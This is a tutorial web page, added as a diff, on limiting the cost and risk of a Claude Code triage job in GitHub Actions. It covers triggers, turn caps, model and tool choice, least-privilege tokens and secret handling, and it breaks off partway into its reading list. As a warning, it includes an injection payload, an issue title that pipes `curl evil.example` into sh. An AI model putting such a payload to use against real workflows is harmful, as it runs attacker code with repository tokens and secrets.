@@ -1,0 +1,482 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>A CI agent costs what its trigger, turn cap, model and tools allow · Norboten</title>
+<meta name="description" content="A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The same job, written the way this lab&#39;s was, can cost as much ">
+<link rel="canonical" href="https://norboten.org/journals/claude-05-the-triage-job-that-spends/"><meta property="og:title" content="A CI agent costs what its trigger, turn cap, model and tools allow · Norboten">
+<meta property="og:description" content="A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The same job, written the way this lab&#39;s was, can cost as much ">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="Norboten">
+<meta property="og:url" content="https://norboten.org/journals/claude-05-the-triage-job-that-spends/"><meta property="og:image" content="https://norboten.org/icon.png">
+<meta property="og:image:alt" content="The Norboten jackal">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="A CI agent costs what its trigger, turn cap, model and tools allow · Norboten">
+<meta name="twitter:description" content="A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The same job, written the way this lab&#39;s was, can cost as much ">
+<meta name="twitter:image" content="https://norboten.org/icon.png">
+<link rel="icon" href="../../icon.png?v=2" sizes="512x512" type="image/png">
+<link rel="icon" href="../../favicon.png?v=2" sizes="64x64" type="image/png">
+<link rel="icon" href="../../favicon.ico?v=2" sizes="16x16 32x32 48x48">
+<link rel="apple-touch-icon" href="../../apple-touch-icon.png?v=2">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;500;600&display=swap">
+<link rel="stylesheet" href="../../style.css">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PN1DY72GTY"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-PN1DY72GTY');
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "LearningResource",
+  "name": "A CI agent costs what its trigger, turn cap, model and tools allow",
+  "description": "A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The same job, written the way this lab\u0027s was, can cost as much ",
+  "url": "https://norboten.org/journals/claude-05-the-triage-job-that-spends/",
+  "inLanguage": "en",
+  "isAccessibleForFree": true,
+  "learningResourceType": "reading",
+  "wordCount": 1866,
+  "timeRequired": "PT40M",
+  "about": ["Claude Code", "AI Agents"],
+  "publisher": {"@type": "Organization", "name": "Norboten", "url": "https://norboten.org/"}
+}
+</script>
+</head>
+<body data-api="" data-root="../../" data-lab="">
+<header class="site">
+  <div class="wrap">
+    <a class="brand" href="../../">[ norboten ]</a>
+    <nav class="site">
+      <a href="../../features/" >Features</a>
+      <a href="../../labs/" >Labs</a>
+      <a href="../../how-it-works/" >How it works</a>
+      <a href="../../journals/" aria-current="page">Journals</a>
+      <a href="../../docs/" >Docs</a>
+      <a class="group" href="../../players/" >Ratings</a>
+      <a class="live" href="../../live/" ><span class="pulse" aria-hidden="true"></span>Live</a>
+      <a class="group" href="../../install/" >Install</a>
+      <a class="gh" href="https://github.com/northelks/norboten" target="_blank" rel="noopener" aria-label="GitHub" title="GitHub">
+        <svg viewBox="0 0 16 16" width="17" height="17" aria-hidden="true" focusable="false"><path fill="currentColor" d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27s1.36.09 2 .27c1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.01 8.01 0 0 0 16 8c0-4.42-3.58-8-8-8Z"/></svg>
+      </a>
+      <a class="gh" href="../../community/" aria-label="Community on Discord" title="Community on Discord" >
+        <svg viewBox="0 0 16 16" width="17" height="17" aria-hidden="true" focusable="false"><path fill="currentColor" d="M13.55 3.02A13.2 13.2 0 0 0 10.3 2a9 9 0 0 0-.42.86 12.3 12.3 0 0 0-3.66 0A9 9 0 0 0 5.8 2a13.2 13.2 0 0 0-3.26 1.02C.48 6.1-.08 9.1.2 12.07A13.3 13.3 0 0 0 4.2 14.1c.32-.44.61-.9.86-1.39a8.6 8.6 0 0 1-1.36-.65l.33-.26a9.5 9.5 0 0 0 8.14 0l.33.26c-.43.26-.89.47-1.36.65.25.49.54.95.86 1.39a13.2 13.2 0 0 0 4-2.03c.34-3.45-.57-6.42-2.45-9.05ZM5.35 10.25c-.79 0-1.44-.72-1.44-1.61s.63-1.62 1.44-1.62 1.45.73 1.44 1.62c0 .89-.64 1.61-1.44 1.61Zm5.3 0c-.79 0-1.44-.72-1.44-1.61s.63-1.62 1.44-1.62 1.45.73 1.44 1.62c0 .89-.63 1.61-1.44 1.61Z"/></svg>
+      </a>
+    </nav>
+  </div>
+</header>
+
+<section class="section">
+  <div class="wrap">
+    <div class="kicker">Journal · The Triage Job That Spends Without Limit</div>
+    <h1>A CI agent costs what its trigger, turn cap, model and tools allow</h1>
+    <p class="muted">
+      40 minutes' reading · 1866 words ·<span class="tag">Claude Code</span><span class="tag">AI Agents</span>    </p>
+    <div class="map-wrap"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 760 52" class="journal-map" role="img" aria-label="the journal by section"><a href="#what-you-should-be-able-to-do-after-this"><title>What you should be able to do after this — 93 words</title><rect x="0.0" y="0" width="33.6" height="30" rx="4" fill="#1d2a23"/></a><a href="#the-mechanism"><title>The mechanism — 736 words</title><rect x="36.6" y="0" width="266.3" height="30" rx="4" fill="#1d2a23"/><text x="44.6" y="19.0" font-size="11" font-family="JetBrains Mono, monospace" fill="#8b9a92">The mechanism</text></a><a href="#a-failure-walked-through"><title>A failure, walked through — 394 words</title><rect x="305.9" y="0" width="142.5" height="30" rx="4" fill="#4ade80"/></a><a href="#common-wrong-turns"><title>Common wrong turns — 216 words</title><rect x="451.5" y="0" width="78.1" height="30" rx="4" fill="#1d2a23"/></a><a href="#cheat-sheet"><title>Cheat sheet — 153 words</title><rect x="532.6" y="0" width="55.4" height="30" rx="4" fill="#1d2a23"/></a><a href="#going-deeper"><title>Going deeper — 83 words</title><rect x="590.9" y="0" width="30.0" height="30" rx="4" fill="#1d2a23"/></a><a href="#review"><title>Review — 376 words</title><rect x="624.0" y="0" width="136.0" height="30" rx="4" fill="#1d2a23"/><text x="632.0" y="19.0" font-size="11" font-family="JetBrains Mono, monospace" fill="#8b9a92">Review</text></a><text x="0" y="47" font-size="11" font-family="JetBrains Mono, monospace" fill="#8b9a92">sections by length · the walkthrough in green</text></svg></div>
+    <div class="cta">
+      <a class="btn solid" href="../../labs/claude-05-the-triage-job-that-spends/">Do the lab</a>
+      <a class="btn" href="print.html#print" target="_blank" rel="noopener" title="Opens the print view; choose Save as PDF in the dialog">Save as PDF</a>
+<a class="btn" href="cheat-sheet.html" target="_blank" rel="noopener" title="The commands, on one or two pages">Cheat sheet</a>      <a class="btn" href="../../journals/">All journals</a>
+    </div>
+  </div>
+</section>
+
+<section class="section">
+  <div class="wrap wide">
+    <div class="docs journal-layout">
+      <nav class="tree">
+        <strong>On this page</strong>
+        <ul>
+          <li><a href="#what-you-should-be-able-to-do-after-this">What you should be able to do after this</a></li>
+          <li><a href="#the-mechanism">The mechanism</a></li>
+          <li><a href="#a-failure-walked-through">A failure, walked through</a></li>
+          <li><a href="#common-wrong-turns">Common wrong turns</a></li>
+          <li><a href="#cheat-sheet">Cheat sheet</a></li>
+          <li><a href="#going-deeper">Going deeper</a></li>
+          <li><a href="#review">Review</a></li>
+        </ul>
+      </nav>
+      <article class="prose journal"><p>A job that asks Claude Code to label an issue should cost a fraction of a cent and take seconds. The
+same job, written the way this lab's was, can cost as much as the model is willing to think about:
+it starts on every issue edit and every comment, it runs on the largest model, it offers that model
+every tool and no reason to stop, and the workflow around it lets it run for six hours with a token
+that can rewrite the repository. Nothing is broken in the everyday sense. The workflow is simply
+unbounded in every direction a cost can grow.</p>
+<p>This lab bounds it in each of those directions, and graded separately, because each is a separate
+decision: <strong>how often it runs</strong> (the trigger), <strong>how long one run can go on</strong> (turns and a timeout),
+<strong>how much each turn costs</strong> (model, tools, output), and <strong>how much damage a run can do</strong>
+(permissions, secrets, and untrusted text in a shell).</p>
+<h2 id="what-you-should-be-able-to-do-after-this">What you should be able to do after this</h2>
+<ul>
+<li>Choose workflow triggers and activity types so a job runs once per event that matters.</li>
+<li>Cap a headless run with <code>--max-turns</code> (and know <code>--max-budget-usd</code>), and read how a capped run ends.</li>
+<li>Pick a model and a tool list for a classification job, and get its answer as structured output.</li>
+<li>Give a workflow's <code>GITHUB_TOKEN</code> only the scopes it uses, and a job a timeout.</li>
+<li>Keep secrets and user-written text out of <code>run:</code> scripts.</li>
+<li>Estimate what a run cost from its JSON result, and say what that estimate is.</li>
+</ul>
+<h2 id="the-mechanism">The mechanism</h2>
+<h3 id="how-often-triggers-and-activity-types">How often: triggers and activity types</h3>
+<p>Every event a workflow lists is a run. Events that have activity types run for <strong>all</strong> of them unless
+<code>types</code> narrows it:</p>
+<table>
+<thead>
+<tr>
+<th>trigger</th>
+<th>runs when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>issues</code></td>
+<td>an issue is opened, edited, deleted, transferred, pinned, closed, reopened, assigned, labeled, milestoned…</td>
+</tr>
+<tr>
+<td><code>issues: types: [opened]</code></td>
+<td>an issue is opened</td>
+</tr>
+<tr>
+<td><code>issue_comment</code></td>
+<td>any comment on any issue or pull request is created, edited or deleted</td>
+</tr>
+<tr>
+<td><code>pull_request_target</code></td>
+<td>pull request activity, in the base repository's context, <strong>with its secrets</strong></td>
+</tr>
+</tbody>
+</table>
+<p>A labelling job needs <code>opened</code>. Events caused by the workflow's own <code>GITHUB_TOKEN</code> do not start new
+runs, which stops the simplest loops, but a person editing a typo in an issue is a paid run under
+<code>types: [opened, edited]</code>. <code>pull_request_target</code> deserves separate caution: it exists to give workflows
+for pull requests from forks access to secrets, which is exactly why it must never run code or prompts
+from the pull request.</p>
+<h3 id="how-long-turns-budget-and-timeout">How long: turns, budget and timeout</h3>
+<p>A <code>claude -p</code> run is a loop: the model answers, and if the answer calls a tool, Claude Code runs it
+and asks again. By default there is <strong>no limit</strong> on that loop. In the lab image, the scripted model
+that always asks to read one more file drove 1,186 turns in 25 seconds before the test killed it —
+an instant fake model; a real one takes seconds per turn and bills every one.</p>
+<ul>
+<li><code>--max-turns N</code> ends the run after N turns with <code>&quot;subtype&quot;: &quot;error_max_turns&quot;</code>, <code>is_error: true</code>
+and exit status 1.</li>
+<li><code>--max-budget-usd X</code> ends it when Claude Code's cost estimate passes X (subagents included).</li>
+<li><code>timeout-minutes</code> on the job is the workflow's backstop; its default is 360.</li>
+</ul>
+<p>A triage answer is one turn. With structured output (below) it takes two — the tool call and the
+end of the turn — so a cap of 3 leaves room without leaving a loop.</p>
+<h3 id="how-much-per-turn-model-tools-and-output">How much per turn: model, tools and output</h3>
+<p>The model is the largest single factor in price. Classification, labelling and short summaries are
+Haiku work; this job named <code>--model opus</code>, and a job that names no model runs on the account's
+default. Tools cost twice: their definitions are sent on every request, and each call is another
+turn. <code>--dangerously-skip-permissions</code> offers the model every tool it has — here 21 of them, <code>Bash</code>,
+<code>Write</code> and <code>WebFetch</code> included — and invites it to explore. <code>--tools &quot;&quot;</code> offers none.</p>
+<p>Structured output makes the answer machine-readable and removes a turn of prose:</p>
+<pre class="hl"><code class="language-sh"><span class="hl-nv">schema</span><span class="hl-o">=</span><span class="hl-s1">'{"type":"object","properties":{"label":{"type":"string","enum":["bug","question","lab-request"]}},"required":["label"],"additionalProperties":false}'</span>
+claude<span class="hl-w"> </span>-p<span class="hl-w"> </span><span class="hl-s2">"Label the GitHub issue on stdin …"</span><span class="hl-w"> </span>--model<span class="hl-w"> </span>haiku<span class="hl-w"> </span>--tools<span class="hl-w"> </span><span class="hl-s2">""</span><span class="hl-w"> </span>--max-turns<span class="hl-w"> </span><span class="hl-m">3</span><span class="hl-w"> </span><span class="hl-se">\</span>
+<span class="hl-w">    </span>--json-schema<span class="hl-w"> </span><span class="hl-s2">"</span><span class="hl-nv">$schema</span><span class="hl-s2">"</span><span class="hl-w"> </span>--output-format<span class="hl-w"> </span>json<span class="hl-w"> </span>&gt;<span class="hl-w"> </span>out.json
+jq<span class="hl-w"> </span>-r<span class="hl-w"> </span><span class="hl-s1">'.structured_output.label'</span><span class="hl-w"> </span>out.json
+</code></pre>
+
+<p>With <code>--json-schema</code> the model is offered exactly one tool, <code>StructuredOutput</code>, whose input is
+validated against the schema, and the validated object lands in <code>structured_output</code>. The <code>result</code>
+field then holds the same object as a JSON <strong>string</strong> — a script reading <code>.result</code> prints
+<code>{&quot;label&quot;:&quot;bug&quot;}</code>.</p>
+<p>For Norboten's own triage job, measured on a real subscription run (docs/claude-code-in-norboten.md),
+this shape costs $0.0028–0.0038 a run with thinking turned off.</p>
+<h3 id="what-the-estimate-is">What the estimate is</h3>
+<p><code>total_cost_usd</code> and <code>modelUsage</code> in the result are Claude Code's client-side estimate at list prices.
+On a subscription token they are not a bill — usage counts against the plan — but they are the right
+number to compare shapes of the same job, and <code>--max-budget-usd</code> uses the same estimate.</p>
+<h3 id="how-much-damage-the-workflow">How much damage: the workflow</h3>
+<ul>
+<li><strong><code>permissions</code>.</strong> <code>write-all</code> gives the token every scope: contents, workflows, packages, releases.
+A labelling job needs <code>issues: write</code>, and <code>contents: read</code> for the checkout. A workflow without a
+<code>permissions</code> block gets the repository's default, which on many repositories is still write.</li>
+<li><strong>Secrets in <code>run:</code>.</strong> <code>${{ secrets.X }}</code> inside a script puts the value into the script's text.
+GitHub masks exact matches in logs, but not a substring cut with <code>cut -c1-24</code>, a base64 of it, or a
+line split across outputs. Pass secrets through <code>env:</code> and never print them.</li>
+<li><strong>Event text in <code>run:</code>.</strong> <code>${{ github.event.issue.title }}</code> is substituted before the shell starts,
+so a title of <code>x&quot;; curl evil.example | sh; echo &quot;</code> becomes code running with the job's token and
+secrets. Pass it through <code>env:</code> and use <code>&quot;$TITLE&quot;</code>, where it is data. For the model the same text is
+also untrusted: tell it so, and give it nothing it can act with.</li>
+</ul>
+<h2 id="a-failure-walked-through">A failure, walked through</h2>
+<p>Replayed in the lab container (Claude Code 2.1.270, scripted models). First, how far the unbounded
+script goes when the model asks forty times for &quot;one more look&quot; before answering:</p>
+<pre class="hl"><code class="language-console"><span class="hl-gp">$ </span><span class="hl-nb">time</span><span class="hl-w"> </span><span class="hl-o">(</span><span class="hl-nv">GITHUB_EVENT_PATH</span><span class="hl-o">=</span>ci/sample-event.json<span class="hl-w"> </span>sh<span class="hl-w"> </span>ci/triage.sh<span class="hl-o">)</span>
+<span class="hl-go">question</span>
+<span class="hl-go">real	0m0.660s</span>
+<span class="hl-gp">$ </span>jq<span class="hl-w"> </span>-c<span class="hl-w"> </span><span class="hl-s1">'{num_turns, total_cost_usd, modelUsage: (.modelUsage | keys)}'</span><span class="hl-w"> </span>/tmp/triage.json
+<span class="hl-go">{"num_turns":41,"total_cost_usd":0.041,"modelUsage":["claude-opus-5"]}</span>
+</code></pre>
+
+<p>Forty-one turns on Opus, for one word. The scripted model reports a flat 100 input tokens per turn, so
+that $0.041 is far below what a real run would show: a real conversation resends its whole history on
+every turn. (Norboten's real lab-author run took 15 turns and 163,802 input tokens.) With the lab's
+own model, which never answers at all, the script does not end:</p>
+<pre class="hl"><code class="language-console"><span class="hl-gp">$ </span><span class="hl-nb">time</span><span class="hl-w"> </span><span class="hl-o">(</span><span class="hl-nv">GITHUB_EVENT_PATH</span><span class="hl-o">=</span>ci/sample-event.json<span class="hl-w"> </span>timeout<span class="hl-w"> </span><span class="hl-m">10</span><span class="hl-w"> </span>sh<span class="hl-w"> </span>ci/triage.sh<span class="hl-p">;</span><span class="hl-w"> </span><span class="hl-nb">echo</span><span class="hl-w"> </span><span class="hl-s2">"exit </span><span class="hl-nv">$?</span><span class="hl-s2">"</span><span class="hl-o">)</span>
+<span class="hl-go">exit 124</span>
+<span class="hl-go">real	0m10.004s</span>
+</code></pre>
+
+<p>A turn cap alone ends the loop:</p>
+<pre class="hl"><code class="language-console"><span class="hl-gp">$ </span>sed<span class="hl-w"> </span>-i<span class="hl-w"> </span><span class="hl-s1">'s/--dangerously-skip-permissions/--dangerously-skip-permissions --max-turns 3/'</span><span class="hl-w"> </span>ci/triage.sh
+<span class="hl-gp">$ </span><span class="hl-nv">GITHUB_EVENT_PATH</span><span class="hl-o">=</span>ci/sample-event.json<span class="hl-w"> </span>sh<span class="hl-w"> </span>ci/triage.sh<span class="hl-p">;</span><span class="hl-w"> </span><span class="hl-nb">echo</span><span class="hl-w"> </span><span class="hl-s2">"exit </span><span class="hl-nv">$?</span><span class="hl-s2">"</span>
+<span class="hl-go">exit 1</span>
+<span class="hl-gp">$ </span>jq<span class="hl-w"> </span>-c<span class="hl-w"> </span><span class="hl-s1">'{subtype, num_turns, is_error}'</span><span class="hl-w"> </span>/tmp/triage.json
+<span class="hl-go">{"subtype":"error_max_turns","num_turns":4,"is_error":true}</span>
+</code></pre>
+
+<p>— but the run is still Opus with every tool, and the grader says so:</p>
+<pre><code>FAIL 03_haiku_with_no_tools: The run asks for claude-opus-5.
+</code></pre>
+<p>The script's final form uses Haiku, no tools, a cap and a schema (above). Against a model that answers
+properly:</p>
+<pre class="hl"><code class="language-console"><span class="hl-gp">$ </span><span class="hl-nv">GITHUB_EVENT_PATH</span><span class="hl-o">=</span>ci/sample-event.json<span class="hl-w"> </span>sh<span class="hl-w"> </span>ci/triage.sh
+<span class="hl-go">bug</span>
+<span class="hl-gp">$ </span>jq<span class="hl-w"> </span>-c<span class="hl-w"> </span><span class="hl-s1">'{subtype, num_turns, structured_output, result}'</span><span class="hl-w"> </span>/tmp/triage.json
+<span class="hl-go">{"subtype":"success","num_turns":2,"structured_output":{"label":"bug"},"result":"{\"label\":\"bug\"}"}</span>
+</code></pre>
+
+<p>The workflow keeps its shape and loses everything unbounded:</p>
+<pre class="hl"><code class="language-yaml"><span class="hl-nt">on</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">issues</span><span class="hl-p">:</span>
+<span class="hl-w">    </span><span class="hl-nt">types</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-p hl-p-Indicator">[</span><span class="hl-nv">opened</span><span class="hl-p hl-p-Indicator">]</span>
+
+<span class="hl-nt">permissions</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">issues</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">write</span>
+<span class="hl-w">  </span><span class="hl-nt">contents</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">read</span>
+
+<span class="hl-nt">concurrency</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">group</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">triage-${{ github.event.issue.number }}</span>
+
+<span class="hl-nt">jobs</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">triage</span><span class="hl-p">:</span>
+<span class="hl-w">    </span><span class="hl-nt">runs-on</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">ubuntu-latest</span>
+<span class="hl-w">    </span><span class="hl-nt">timeout-minutes</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">10</span>
+<span class="hl-w">    </span><span class="hl-nt">steps</span><span class="hl-p">:</span>
+<span class="hl-w">      </span><span class="hl-p hl-p-Indicator">-</span><span class="hl-w"> </span><span class="hl-nt">uses</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">actions/checkout@v4</span>
+<span class="hl-w">      </span><span class="hl-p hl-p-Indicator">-</span><span class="hl-w"> </span><span class="hl-nt">name</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">Install Claude Code</span>
+<span class="hl-w">        </span><span class="hl-nt">run</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">curl -fsSL https://claude.ai/install.sh | bash -s 2.1.270</span>
+<span class="hl-w">      </span><span class="hl-p hl-p-Indicator">-</span><span class="hl-w"> </span><span class="hl-nt">name</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">Triage</span>
+<span class="hl-w">        </span><span class="hl-nt">env</span><span class="hl-p">:</span>
+<span class="hl-w">          </span><span class="hl-nt">CLAUDE_CODE_OAUTH_TOKEN</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}</span>
+<span class="hl-w">          </span><span class="hl-nt">GH_TOKEN</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">${{ github.token }}</span>
+<span class="hl-w">          </span><span class="hl-nt">ISSUE</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">${{ github.event.issue.number }}</span>
+<span class="hl-w">        </span><span class="hl-nt">run</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-p hl-p-Indicator">|</span>
+<span class="hl-w">          </span><span class="hl-no">label=$(sh ci/triage.sh)</span>
+<span class="hl-w">          </span><span class="hl-no">gh issue edit "$ISSUE" --add-label "$label"</span>
+</code></pre>
+
+<p>The &quot;check the token is there&quot; step is gone rather than fixed: there is no safe way to print part of a
+secret. The grader:</p>
+<pre><code>PASS 01_only_new_issues_start_the_job: Only a newly opened issue starts the job.
+PASS 02_a_looping_model_is_stopped: A model that kept asking for more was stopped after 3 request(s).
+PASS 03_haiku_with_no_tools: Haiku, no tools, and the label read from structured output.
+     tools offered: ['StructuredOutput']
+PASS 04_least_privilege_and_a_timeout: Issues write and contents read at most, and a timeout of 15 minutes or less.
+PASS 05_nothing_secret_or_untrusted_in_run_scripts: Secrets and event fields reach the scripts only through env.
+</code></pre>
+<h2 id="common-wrong-turns">Common wrong turns</h2>
+<p><strong>Capping turns and stopping there.</strong> The loop ends; each of the three turns is still Opus with 21 tool
+definitions. Caps bound the worst case; model and tools set the normal case.</p>
+<p><strong>Relying on <code>timeout-minutes</code> as the cap.</strong> Ten minutes of turns is still hundreds of paid requests.
+The timeout is for a hung process, not for a model that keeps going.</p>
+<p><strong>Reading <code>.result</code> after adding <code>--json-schema</code>.</strong> It is the JSON as a string. Read
+<code>.structured_output.label</code>, and give it a default for a run that ended without one.</p>
+<p><strong>Quoting the expression: <code>echo &quot;${{ github.event.issue.title }}&quot;</code>.</strong> The quotes are part of the script
+text the expression is pasted into; a title containing <code>&quot;</code> closes them. Only <code>env:</code> makes it data.</p>
+<p><strong><code>permissions: read-all</code> plus a step that uses a personal access token for writing.</strong> The PAT is a
+longer-lived secret with more scope than the job's own token. Grant <code>issues: write</code> to <code>GITHUB_TOKEN</code>.</p>
+<p><strong>Dropping <code>set -eu</code> so the capped run &quot;does not fail&quot;.</strong> A run that hit its cap produced no label;
+letting the script carry on labels issues with an empty string. Fail, or fall back to a label a person
+will look at.</p>
+<p><strong>Moving to <code>anthropics/claude-code-action</code> and assuming it is bounded.</strong> The action passes your
+<code>claude_args</code>; turn caps, model and tools are still yours to set.</p>
+<h2 id="cheat-sheet">Cheat sheet</h2>
+<pre class="hl"><code class="language-bash"><span class="hl-c1"># one bounded classification</span>
+claude<span class="hl-w"> </span>-p<span class="hl-w"> </span><span class="hl-s2">"…"</span><span class="hl-w"> </span>--model<span class="hl-w"> </span>haiku<span class="hl-w"> </span>--tools<span class="hl-w"> </span><span class="hl-s2">""</span><span class="hl-w"> </span>--max-turns<span class="hl-w"> </span><span class="hl-m">3</span><span class="hl-w"> </span><span class="hl-se">\</span>
+<span class="hl-w">  </span>--json-schema<span class="hl-w"> </span><span class="hl-s1">'{"type":"object","properties":{"label":{"type":"string","enum":["bug","question"]}},"required":["label"]}'</span><span class="hl-w"> </span><span class="hl-se">\</span>
+<span class="hl-w">  </span>--no-session-persistence<span class="hl-w"> </span>--output-format<span class="hl-w"> </span>json<span class="hl-w"> </span>&gt;<span class="hl-w"> </span>out.json
+jq<span class="hl-w"> </span>-r<span class="hl-w"> </span><span class="hl-s1">'.structured_output.label // "question"'</span><span class="hl-w"> </span>out.json
+jq<span class="hl-w"> </span>-c<span class="hl-w"> </span><span class="hl-s1">'{subtype, num_turns, is_error, total_cost_usd, models: (.modelUsage|keys)}'</span><span class="hl-w"> </span>out.json
+
+<span class="hl-c1"># other caps</span>
+claude<span class="hl-w"> </span>-p<span class="hl-w"> </span><span class="hl-s2">"…"</span><span class="hl-w"> </span>--max-budget-usd<span class="hl-w"> </span><span class="hl-m">0</span>.50<span class="hl-w">          </span><span class="hl-c1"># estimate-based, subagents included</span>
+<span class="hl-nv">MAX_THINKING_TOKENS</span><span class="hl-o">=</span><span class="hl-m">0</span><span class="hl-w"> </span>claude<span class="hl-w"> </span>-p<span class="hl-w"> </span><span class="hl-s2">"…"</span><span class="hl-w">          </span><span class="hl-c1"># no extended thinking for no-tool jobs</span>
+
+<span class="hl-c1"># is a run still going? (a job step that never ends)</span>
+timeout<span class="hl-w"> </span><span class="hl-m">300</span><span class="hl-w"> </span>sh<span class="hl-w"> </span>ci/triage.sh<span class="hl-p">;</span><span class="hl-w"> </span><span class="hl-nb">echo</span><span class="hl-w"> </span><span class="hl-s2">"exit </span><span class="hl-nv">$?</span><span class="hl-s2">"</span><span class="hl-w">  </span><span class="hl-c1"># 124 = killed by timeout</span>
+</code></pre>
+
+<pre class="hl"><code class="language-yaml"><span class="hl-c1"># workflow shape</span>
+<span class="hl-nt">on</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">issues</span><span class="hl-p">:</span>
+<span class="hl-w">    </span><span class="hl-nt">types</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-p hl-p-Indicator">[</span><span class="hl-nv">opened</span><span class="hl-p hl-p-Indicator">]</span>
+<span class="hl-nt">permissions</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">issues</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">write</span>
+<span class="hl-w">  </span><span class="hl-nt">contents</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">read</span>
+<span class="hl-nt">concurrency</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">group</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">triage-${{ github.event.issue.number }}</span>
+<span class="hl-nt">jobs</span><span class="hl-p">:</span>
+<span class="hl-w">  </span><span class="hl-nt">triage</span><span class="hl-p">:</span>
+<span class="hl-w">    </span><span class="hl-nt">timeout-minutes</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">10</span>
+<span class="hl-w">    </span><span class="hl-nt">steps</span><span class="hl-p">:</span>
+<span class="hl-w">      </span><span class="hl-p hl-p-Indicator">-</span><span class="hl-w"> </span><span class="hl-nt">env</span><span class="hl-p">:</span>
+<span class="hl-w">          </span><span class="hl-nt">CLAUDE_CODE_OAUTH_TOKEN</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}</span>
+<span class="hl-w">          </span><span class="hl-nt">TITLE</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">${{ github.event.issue.title }}</span><span class="hl-w">     </span><span class="hl-c1"># data, not code</span>
+<span class="hl-w">        </span><span class="hl-nt">run</span><span class="hl-p">:</span><span class="hl-w"> </span><span class="hl-l hl-l-Scalar hl-l-Scalar-Plain">printf '%s\n' "$TITLE" | sh ci/triage.sh</span>
+</code></pre>
+
+<pre class="hl"><code class="language-bash"><span class="hl-c1"># audit a workflow for expressions pasted into shells</span>
+grep<span class="hl-w"> </span>-n<span class="hl-w"> </span><span class="hl-s1">'run:'</span><span class="hl-w"> </span>-A20<span class="hl-w"> </span>.github/workflows/*.yml<span class="hl-w"> </span><span class="hl-p">|</span><span class="hl-w"> </span>grep<span class="hl-w"> </span>-E<span class="hl-w"> </span><span class="hl-s1">'\$\{\{ *(secrets|github\.event)\.'</span>
+</code></pre>
+
+<h2 id="going-deeper">Going deeper</h2>
+<p>Where this lab's hints send you for reading, beyond this journal. In the TUI, <code>h</code> shows a
+hint's reading and <code>l</code> opens a journal section; the lab's page on the site lists the same.</p>
+<ul>
